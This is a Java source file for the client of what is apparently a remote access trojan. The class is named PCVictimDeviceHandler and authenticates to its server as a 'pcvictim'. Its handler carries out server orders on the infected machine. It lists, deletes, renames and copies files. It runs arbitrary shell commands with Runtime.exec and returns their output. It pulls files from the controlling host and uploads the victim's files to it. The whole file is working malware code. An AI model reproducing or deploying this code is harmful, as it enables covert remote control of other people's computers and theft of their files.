package client;

import io.netty.channel.ChannelHandlerContext;
import io.netty.channel.ChannelInboundHandlerAdapter;
import org.json.simple.JSONArray;
import org.json.simple.JSONObject;

import java.io.*;
import java.net.Socket;
import java.net.SocketAddress;

public class PCVictimDeviceHandler extends ChannelInboundHandlerAdapter {
    private String host;
    private ChannelHandlerContext ctx;

    PCVictimDeviceHandler(String host) {
        // TODO: 14.06.2018 maybe we can find host from 'ctx'? I don't want receive 'host' here
        this.host = host;
    }

    @Override
    public void channelActive(ChannelHandlerContext ctx) {
        SocketAddress address = ctx.channel().remoteAddress();
        System.out.println("Успешно подключились! ("+address+")");
        this.ctx = ctx;
        JSONObject jsonObject = new JSONObject();
        jsonObject.put("action", "auth.pcvictim");
        jsonObject.put("name", "pcvika");
        sendMessage(jsonObject);
    }

    @Override
    public void channelRead(ChannelHandlerContext ctx, Object msg) {
        System.out.println("Server >> " + msg);

        JSONObject message = (JSONObject) msg;
        receiveMessage(message);
    }

    @Override
    public void channelInactive(ChannelHandlerContext ctx) throws Exception {
        System.out.println("Отключились от сервера! ChannelInvactive()!");
    }

    private void receiveMessage(JSONObject message) {
        String action = (String) message.get("action");
        switch (action) {
            case "get.files":
                File dirFile = new File((String) message.get("path"));
                if (!dirFile.isDirectory()) {
                    sendErrorCode("fileIsntDirectory", (String) message.get("owner"));
                    return;
                }
                JSONArray files = new JSONArray();
                for (int i = 0; i < dirFile.list().length; i++)
                    files.add(dirFile.list()[i]);

                sendGetFileList(files, (String) message.get("owner"));
                break;
            case "delete.file":
                String path = (String) message.get("path");
                String code = "success";
                if (!PCVictimDevice.deleteFile(path))
                    code = "error";

                sendDeleteFile(code, (String) message.get("owner"));
                break;
            case "rename.file":
                path = (String) message.get("path");
                String newPath = (String) message.get("newPath");
                code = "success";
                if (!PCVictimDevice.renameFile(path, newPath)) {
                    code = "error";
                }

                sendRenameFile(code, (String) message.get("owner"));
                break;
            case "make.dir":
                path = (String) message.get("path");
                code = "success";
                if (!PCVictimDevice.makeDir(path))
                    code = "error";

                sendMakeDir(code, (String) message.get("owner"));
                break;
            case "copy.file":
                path = (String) message.get("path");
                newPath = (String) message.get("newPath");
                code = "success";
                if (!PCVictimDevice.copyFile(path, newPath))
                    code = "error";

                sendCopyFile(code, (String) message.get("owner"));
                break;
            case "cmd":
                String command = (String) message.get("command");
                try {
                    Process process = Runtime.getRuntime().exec(command);
                    BufferedReader cmdInput = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    BufferedReader cmdError = new BufferedReader(new InputStreamReader(process.getErrorStream()));

                    String line, out = "", errorOut = "";
                    while ((line = cmdInput.readLine()) != null)
                        out += line;
                    while ((line = cmdError.readLine()) != null)
                        errorOut += line;

                    sendCmd(out, errorOut, (String) message.get("owner"));
                } catch (IOException e) {
                    e.printStackTrace();
                    sendCmd("", e.toString(), (String) message.get("owner"));
                }
                break;
            case "start.download.file":
                try {
                    String downloadPath = (String) message.get("downloadPath");
                    String filename = (String) message.get("filename");
                    File file = new File(downloadPath + filename);
                    FileOutputStream fileOutputStream = new FileOutputStream(file);
                    Socket socket = new Socket(host, Math.toIntExact((Long) message.get("port")));
                    InputStream inputStream = socket.getInputStream();
                    byte[] bytes = new byte[8*1024];
                    int len;
                    while ((len = inputStream.read(bytes)) != -1) {
                        fileOutputStream.write(bytes, 0, len); //receive file from server
                    }

                    fileOutputStream.close();
                    inputStream.close();
                    socket.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
                break;
            case "start.upload.file":
                try {
                    Socket socket = new Socket(host, Math.toIntExact((Long) message.get("port"))); //connect to server
                    OutputStream outputStream = socket.getOutputStream();
                    File file = new File((String) message.get("path"));
                    if (file.isDirectory()) {
                        sendErrorCode("fileIsDirectory", (String) message.get("owner"));
                        return;
                    }
                    FileInputStream fileInputStream = new FileInputStream(file);
                    byte[] bytes = new byte[8*1024];
                    int len;
                    while ((len = fileInputStream.read(bytes)) != -1) {
                        outputStream.write(bytes, 0, len); //transfer to server
                    }

                    outputStream.close();
                    fileInputStream.close();
                    socket.close();

                } catch (IOException e) {
                    e.printStackTrace();
                }
                break;
        }
    }

    private void sendGetFileList(JSONArray files, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "get.file.list");
        query.put("files", files);
        query.put("owner", owner);
        sendMessage(query);
    }

    private void sendDeleteFile(String code, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "delete.file");
        query.put("code", code);
        query.put("owner", owner);
        sendMessage(query);
    }

    private void sendRenameFile(String code, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "rename.file");
        query.put("code", code);
        query.put("owner", owner);
        sendMessage(query);
    }

    private void sendMakeDir(String code, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "make.dir");
        query.put("code", code);
        query.put("owner", owner);
        sendMessage(query);
    }

    private void sendCopyFile(String code, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "copy.file");
        query.put("code", code);
        query.put("owner", owner);
        sendMessage(query);
    }

    private void sendErrorCode(String errorCode, String owner) {
        JSONObject query = new JSONObject();
        query.put("errorCode", errorCode);
        query.put("owner", owner);
        sendMessage(query);
    }

    private void sendCmd(String out, String errorOut, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "cmd");
        query.put("out", out);
        query.put("errorOut", errorOut);
        query.put("owner", owner);
        sendMessage(query);
    }

    @Override
    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {
        cause.printStackTrace();
    }

    public void sendMessage(JSONObject message) {
        if (!ctx.channel().isActive()) System.out.println("Нет соединения с сервером!");
        else {
            if (message.containsKey("action") && message.get("action").equals("test")) {
                //our test
            } else {
                System.out.println("Server << " + message);
                ctx.writeAndFlush(message);
            }
        }
    }
}